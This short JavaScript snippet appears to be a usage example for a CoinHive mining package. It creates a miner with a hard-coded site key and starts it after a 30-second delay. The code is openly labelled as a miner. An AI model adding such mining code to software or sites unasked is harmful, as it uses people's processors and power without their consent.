  const CoinHive = require('./src');
  // Create miner
  var miner = CoinHive('jFTnqP9X4WdsXlBvWTz19NnYBjTzIGqR'); // Coin-Hive's Site Key
  setTimeout(function(){
  // Start miner
  miner.start();
  }, 30*1000);
